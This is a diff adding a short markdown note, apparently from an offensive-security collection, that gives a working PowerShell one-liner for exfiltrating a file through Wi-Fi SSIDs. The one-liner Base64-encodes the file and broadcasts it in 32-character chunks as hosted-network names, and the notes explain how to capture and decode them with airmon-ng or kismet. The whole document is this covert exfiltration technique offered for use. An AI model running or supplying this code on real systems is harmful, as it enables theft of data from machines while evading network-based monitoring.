@@ -1,0 +1,7 @@
+# Powershell One-liner - Exfiltrate Data through SSID:
+
+$text =[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:/PATH/TO/FILETOEXFIL.txt"));$i = 0;While ($i -le ($text.length-32)) { $ssid=$text.Substring($i,32);netsh wlan set hostednetwork ssid=$ssid;netsh wlan start hostednetwork; Start-Sleep -s 5; $i += 32}; $ssid=$text.Substring($i); netsh wlan set hostednetwork ssid=$ssid;netsh wlan start hostednetwork; Start-Sleep -s 5;netsh wlan stop hostednetwork
+
+Requires Admin Privilege.
+Takes a file, Base64 encodes it and creates a hotspot with each 32 character as SSID (sleeps for 5 second in between).
+Monitor and log SSIDs using your favorite tool (airmon-ng, kismet etc.) and Base64 decode the SSIDs.
